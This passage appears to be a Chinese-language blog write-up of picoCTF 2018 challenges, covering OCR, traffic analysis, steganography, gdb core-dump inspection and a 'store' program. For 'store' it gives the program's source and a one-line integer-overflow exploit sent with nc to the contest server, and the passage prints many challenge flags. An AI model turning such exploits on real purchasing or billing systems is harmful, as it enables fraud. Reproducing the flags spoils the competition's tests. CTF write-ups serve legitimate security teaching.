tesseract-ocr</span><br><span class="line"><span class="variable">$tesseract</span> cut_flag.jpg res &amp;&amp; cat res.txt</span><br><span class="line">Tesseract Open Source OCR Engine v4.0.0-rc4 with Leptonica</span><br><span class="line">Your flag is: <span class="string">"picoCTF &#123;FDBfbc6141e7F 4bscI90CIaE7SbI63aEf&#125; "</span></span><br></pre></td></tr></table></figure><p>最后结果：<code>picoCTF{FDBfbC6141e7F4b8c90C9aE78b963aEf}</code></p><h2 id="Lying-Out"><a href="#Lying-Out" class="headerlink" title="Lying Out"></a>Lying Out</h2><p>根据日常流量图判断流量可能异常的时间点。</p><p><img src="1538371756947.png" alt="1538371756947"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">log=[</span><br><span class="line">    <span class="number">10900</span>,<span class="number">10800</span>,<span class="number">10850</span>,<span class="number">11000</span>,<span class="number">10800</span>,<span class="number">10750</span>,<span class="number">10800</span>,<span class="number">10850</span>,</span><br><span class="line">    <span class="number">10900</span>,<span class="number">11000</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">11000</span>,<span class="number">10900</span>,<span class="number">10700</span>,<span class="number">10850</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">10850</span>,<span class="number">11000</span>,<span class="number">11050</span>,<span class="number">10650</span>,<span class="number">10800</span>,<span class="number">10700</span>,<span class="number">11000</span>,</span><br><span class="line">    <span class="number">10900</span>,<span class="number">10950</span>,<span class="number">10950</span>,<span class="number">10800</span>,<span class="number">11000</span>,<span class="number">11100</span>,<span class="number">11900</span>,<span class="number">13400</span>,</span><br><span class="line">    <span class="number">13800</span>,<span class="number">13400</span>,<span class="number">12000</span>,<span class="number">11000</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10700</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">11000</span>,<span class="number">10900</span>,<span class="number">11050</span>,<span class="number">11800</span>,<span class="number">13100</span>,<span class="number">14600</span>,<span class="number">16100</span>,</span><br><span class="line">    <span class="number">16600</span>,<span class="number">16400</span>,<span class="number">14400</span>,<span class="number">12800</span>,<span class="number">11800</span>,<span class="number">11000</span>,<span class="number">10950</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10800</span>,<span class="number">10900</span>,<span class="number">10850</span>,<span class="number">10850</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10800</span>,<span class="number">11000</span>,<span class="number">11000</span>,<span class="number">11000</span>,<span class="number">11400</span>,<span class="number">11900</span>,<span class="number">13000</span>,<span class="number">14000</span>,</span><br><span class="line">    <span class="number">14800</span>,<span class="number">15800</span>,<span class="number">16200</span>,<span class="number">15800</span>,<span class="number">14700</span>,<span class="number">13700</span>,<span class="number">12200</span>,<span class="number">12100</span>,</span><br><span class="line">    <span class="number">11100</span>,<span class="number">11000</span>,<span class="number">10900</span>,<span class="number">10800</span>,<span class="number">10700</span>,<span class="number">11000</span>,<span class="number">11000</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10900</span>,<span class="number">10700</span>,<span class="number">10900</span>,<span class="number">10800</span>,<span class="number">10750</span>,<span class="number">10950</span>,<span class="number">10900</span>,<span class="number">10800</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">'2018shell2.picoctf.com'</span>,<span class="number">39410</span>)</span><br><span class="line">prompt=r.recvuntil(<span class="string">'num_IPs'</span>)</span><br><span class="line">data=r.recv()</span><br><span class="line">nums=data.split()</span><br><span class="line"><span class="keyword">print</span> prompt,<span class="string">'\n'</span>,nums</span><br><span class="line">group=len(nums)/<span class="number">4</span></span><br><span class="line">res=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(group):</span><br><span class="line">t=nums[i*<span class="number">4</span>+<span class="number">2</span>].split(<span class="string">':'</span>)</span><br><span class="line">tt=int(t[<span class="number">0</span>])*<span class="number">4</span>+int(t[<span class="number">1</span>])/<span class="number">15</span></span><br><span class="line"><span class="keyword">if</span> int(nums[i*<span class="number">4</span>+<span class="number">3</span>])&gt;log[tt]:</span><br><span class="line">res.append(nums[i*<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">' '</span>.join(res))</span><br><span class="line"><span class="keyword">print</span> <span class="string">' '</span>.join(res),r.recv()</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [x] Opening connection to 2018shell2.picoctf.com on port 39410</span></span><br><span class="line"><span class="comment"># [x] Opening connection to 2018shell2.picoctf.com on port 39410: Trying 18.224.157.204</span></span><br><span class="line"><span class="comment"># [+] Opening connection to 2018shell2.picoctf.com on port 39410: Done</span></span><br><span class="line"><span class="comment"># You'll need to consult the file `traffic.png` to answer the following questions.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Which of these logs have significantly higher traffic than is usual for their time of day? You can see usual traffic on the attached plot. There may be multiple logs with higher than usual traffic, so answer all of them! Give your answer as a list of `log_ID` values separated by spaces. For example, if you want to answer that logs 2 and 7 are the ones with higher than usual traffic, type 2 7.</span></span><br><span class="line"><span class="comment">#     log_ID      time  num_IPs </span></span><br><span class="line"><span class="comment"># ['0', '0', '01:00:00', '11637', '1', '1', '01:30:00', '11640', '2', '2', '02:45:00', '11616', '3', '3', '10:45:00', '9962', '4', '4', '10:45:00', '10409', '5', '5', '11:45:00', '12732', '6', '6', '14:15:00', '10538', '7', '7', '16:15:00', '10233', '8', '8', '17:30:00', '10839', '9', '9', '20:15:00', '11936', '10', '10', '20:30:00', '9898', '11', '11', '21:45:00', '9653', '12', '12', '22:30:00', '10252', '13', '13', '23:15:00', '9619']</span></span><br><span class="line"><span class="comment"># 0 1 2 9 Correct!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Great job. You've earned the flag: picoCTF&#123;w4y_0ut_940df760&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [*] Closed connection to 2018shell2.picoctf.com port 39410</span></span><br><span class="line"><span class="comment"># [Finished in 3.6s]</span></span><br></pre></td></tr></table></figure><h2 id="What’s-My-Name"><a href="#What’s-My-Name" class="headerlink" title="What’s My Name?"></a>What’s My Name?</h2><p><code>picoCTF{w4lt3r_wh1t3_ddfad6f8f4255adc73e862e3cebeee9d}</code>  </p><p><img src="1538368152075.png" alt="1538368152075"></p><h2 id="Malware-Shops"><a href="#Malware-Shops" class="headerlink" title="Malware Shops"></a>Malware Shops</h2><p>附件貌似有问题，爆破出第一个答案是5，第二个随手交一下flag就出来了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ nc 2018shell2.picoctf.com 57920</span><br><span class="line">You<span class="string">'ll need to consult the file `clusters.png` to answer the following questions.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">How many attackers created the malware in this dataset?</span></span><br><span class="line"><span class="string">5</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">In the following sample of files from the larger dataset, which file was made by the same attacker who made the file 87847bfc? Indicate your answer by entering that file'</span>s <span class="built_in">hash</span>.</span><br><span class="line">       <span class="built_in">hash</span>  jmp_count  add_count</span><br><span class="line">0  87847bfc       32.0       29.0</span><br><span class="line">1  7eeed4b3       34.0       34.0</span><br><span class="line">2  ad5e4ce0       21.0       64.0</span><br><span class="line">3  628e79cf       14.0       26.0</span><br><span class="line">4  b5e53809       11.0       35.0</span><br><span class="line">5  ebaf5ccd       15.0       13.0</span><br><span class="line">6  94ad3582       37.0       10.0</span><br><span class="line">7  42f1d364       23.0       68.0</span><br><span class="line">8  93827b93       11.0       38.0</span><br><span class="line">9  c08300fe       41.0       10.0</span><br><span class="line">7eeed4b3</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Great job. You<span class="string">'ve earned the flag: picoCTF&#123;w4y_0ut_0915ebc6&#125;</span></span><br></pre></td></tr></table></figure><h2 id="LoadSomeBits"><a href="#LoadSomeBits" class="headerlink" title="LoadSomeBits"></a>LoadSomeBits</h2><p>最低有效位隐写，需要fuzz起始偏移。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat lsb.py</span></span><br><span class="line">import binascii</span><br><span class="line">lsb=<span class="string">''</span>.join(map(lambda x:str(ord(x)&amp;1),open(<span class="string">'pico2018-special-logo.bmp'</span>,<span class="string">'rb'</span>).<span class="built_in">read</span>()))</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> range(16):</span><br><span class="line">        tmp=lsb[offset:]</span><br><span class="line">        tmps=<span class="string">''</span>.join(chr(int(tmp[i:i+8],2)) <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(tmp),8))</span><br><span class="line">        <span class="keyword">if</span>  <span class="string">'pico'</span> <span class="keyword">in</span> tmps:</span><br><span class="line">                <span class="built_in">print</span> tmps</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python lsb.py | strings | grep -o picoCTF&#123;.*&#125;</span></span><br><span class="line">picoCTF&#123;st0r3d_iN_tH3_l345t_s1gn1f1c4nT_b1t5_2903593693&#125;</span><br></pre></td></tr></table></figure><h2 id="core"><a href="#core" class="headerlink" title="core"></a>core</h2><p>core file或者core dunp是一个保存进程运行时内存镜像和进程状态（如寄存器的值等）的文件。没挂调试器的程序崩溃时一般会自动产生core文件用于post-mortem debugging。可以使用 <code>gdb  program [core dump]</code> 开始调试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x080487ec &lt;+0&gt;:     lea    ecx,[esp+0x4]</span><br><span class="line">   0x080487f0 &lt;+4&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x080487f3 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x080487f6 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x080487f7 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x080487f9 &lt;+13&gt;:    push   ecx</span><br><span class="line">   0x080487fa &lt;+14&gt;:    sub    esp,0x4</span><br><span class="line">   0x080487fd &lt;+17&gt;:    call   0x80485bb &lt;load_strings&gt;</span><br><span class="line">   0x08048802 &lt;+22&gt;:    call   0x80487c1 &lt;print_flag&gt;</span><br><span class="line">   0x08048807 &lt;+27&gt;:    mov    eax,0x0</span><br><span class="line">   0x0804880c &lt;+32&gt;:    add    esp,0x4</span><br><span class="line">   0x0804880f &lt;+35&gt;:    pop    ecx</span><br><span class="line">   0x08048810 &lt;+36&gt;:    pop    ebp</span><br><span class="line">   0x08048811 &lt;+37&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048814 &lt;+40&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas print_flag</span><br><span class="line">Dump of assembler code for function print_flag:</span><br><span class="line">=&gt; 0x080487c1 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x080487c2 &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x080487c4 &lt;+3&gt;:     sub    esp,0x18</span><br><span class="line">   0x080487c7 &lt;+6&gt;:     mov    DWORD PTR [ebp-0xc],0x539</span><br><span class="line">   0x080487ce &lt;+13&gt;:    mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080487d1 &lt;+16&gt;:    mov    eax,DWORD PTR [eax*4+0x804a080]</span><br><span class="line">   0x080487d8 &lt;+23&gt;:    sub    esp,0x8</span><br><span class="line">   0x080487db &lt;+26&gt;:    push   eax ;flag字符串的地址保存在eax中</span><br><span class="line">   0x080487dc &lt;+27&gt;:    push   0x804894c</span><br><span class="line">   0x080487e1 &lt;+32&gt;:    call   0x8048410 &lt;printf@plt&gt;</span><br><span class="line">   0x080487e6 &lt;+37&gt;:    add    esp,0x10</span><br><span class="line">   0x080487e9 &lt;+40&gt;:    nop</span><br><span class="line">   0x080487ea &lt;+41&gt;:    leave</span><br><span class="line">   0x080487eb &lt;+42&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) x/sb *(0x804a080+4*0x539)</span><br><span class="line">0x80610f0:      &quot;c96bd0fa2da5c0853cf12c4f93fce288&quot;s</span><br></pre></td></tr></table></figure><p><code>picoCTF{c96bd0fa2da5c0853cf12c4f93fce288}</code>每个人的答案是不同的。</p><h1 id="General-Skills"><a href="#General-Skills" class="headerlink" title="General Skills"></a>General Skills</h1><h2 id="absolutely-relative"><a href="#absolutely-relative" class="headerlink" title="absolutely relative"></a>absolutely relative</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> yes_len 3</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *yes = <span class="string">"yes"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">99</span>];</span><br><span class="line">    <span class="keyword">char</span> permission[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    FILE * file;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    file = fopen(<span class="string">"/problems/absolutely-relative_2_69862edfe341b57b6ed2c62c7107daee/flag.txt"</span> , <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">"%s"</span>, flag)!=EOF)</span><br><span class="line">    fclose(file);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    file = fopen( <span class="string">"./permission.txt"</span> , <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(file, <span class="string">"%s"</span>, permission);</span><br><span class="line">        &#125;</span><br><span class="line">        permission[<span class="number">5</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        fclose(file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(permission, yes, yes_len)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You have the write permissions.\n%s\n"</span>, flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You do not have sufficient permissions to view the flag.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1539439034675.png" alt="1539439034675"></p><p><code>picoCTF{3v3r1ng_1$_r3l3t1v3_372b3859}</code> </p><h2 id="Aca-Shell-A"><a href="#Aca-Shell-A" class="headerlink" title="Aca-Shell-A"></a>Aca-Shell-A</h2><p><img src="1539139814957.png" alt="1539139814957"></p><p><img src="1539139848050.png" alt="1539139848050"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;CrUsHeD_It_17ab99f5&#125;</span><br></pre></td></tr></table></figure><h2 id="in-out-error"><a href="#in-out-error" class="headerlink" title="in out error"></a>in out error</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Please may I have the flag?"</span> | ./<span class="keyword">in</span>-out-error  &gt; ~/result.txt</span><br><span class="line"><span class="comment">#picoCTF&#123;p1p1ng_1S_4_7h1ng_f37fb67e&#125;</span></span><br></pre></td></tr></table></figure><h2 id="learn-gdb"><a href="#learn-gdb" class="headerlink" title="learn gdb"></a>learn gdb</h2><p><code>picoCTF{gDb_iS_sUp3r_u53fuL_f3f39814}</code> </p><p><img src="1538828295272.png" alt="1538828295272"></p><h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="meta"># curl https:<span class="comment">//2018shell2.picoctf.com/static/655fb38d2f256165a0163d4a606f998a/source.c</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> con;</span><br><span class="line">    con = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> account_balance = <span class="number">1100</span>;</span><br><span class="line">    <span class="keyword">while</span>(con == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to the Store App V1.0\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"World's Most Secure Purchasing App\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[1] Check Account Balance\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[2] Buy Stuff\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[3] Exit\n"</span>);</span><br><span class="line">        <span class="keyword">int</span> menu;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n Enter a menu selection\n"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line">        <span class="keyword">if</span>(menu == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\n\n Balance: %d \n\n\n"</span>, account_balance);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(menu == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Current Auctions\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[1] I Can't Believe its not a Flag!\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[2] Real Flag\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> auction_choice;</span><br><span class="line">            fflush(<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;auction_choice);</span><br><span class="line">            <span class="keyword">if</span>(auction_choice == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Imitation Flags cost 1000 each, how many would you like?\n"</span>);</span><br><span class="line">                <span class="keyword">int</span> number_flags = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;number_flags);</span><br><span class="line">                <span class="keyword">if</span>(number_flags &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">int</span> total_cost = <span class="number">0</span>;</span><br><span class="line">                    total_cost = <span class="number">1000</span>*number_flags;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\nYour total cost is: %d\n"</span>, total_cost);</span><br><span class="line">                    <span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">                        account_balance = account_balance - total_cost;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nYour new balance: %d\n\n"</span>, account_balance);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"Not enough funds\n"</span>);</span><br><span class="line">                    &#125;   </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(auction_choice == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"A genuine Flag costs 100000 dollars, and we only have 1 in stock\n"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Enter 1 to purchase"</span>);</span><br><span class="line">                <span class="keyword">int</span> bid = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bid);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(bid == <span class="number">1</span>)&#123;                </span><br><span class="line">                    <span class="keyword">if</span>(account_balance &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"YOUR FLAG IS:\n"</span>);</span><br><span class="line">                        &#125;                 </span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nNot enough funds for transaction\n\n\n"</span>);</span><br><span class="line">                    &#125;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            con = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整数溢出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'print "2\n1\n"+str(((1100-100001)+2**32)/1000)+"\n2\n2\n1\n3\n"'</span> | nc 2018shell2.picoctf.com 43581 | grep pico</span><br><span class="line"><span class="comment"># Enter 1 to purchaseYOUR FLAG IS: picoCTF&#123;numb3r3_4r3nt_s4f3_6bd13a8c&#125;</span></span><br></pre></td></tr></table></figure><h2 id="roulette"><a href="#roulette" class="headerlink" title="roulette"></a>roulette</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 